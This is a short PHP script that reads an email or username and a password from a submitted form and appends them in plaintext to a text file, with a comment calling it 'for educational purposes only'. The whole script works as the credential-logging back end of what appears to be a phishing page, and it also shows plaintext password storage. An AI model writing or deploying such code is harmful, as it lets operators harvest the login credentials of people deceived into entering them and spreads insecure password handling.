<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Save data to a text file (for educational purposes only)
    $data = "Email/Username: $email\nPassword: $password\n\n";
    file_put_contents('user_data.txt', $data, FILE_APPEND);

    echo "Data saved successfully!";
}
?>
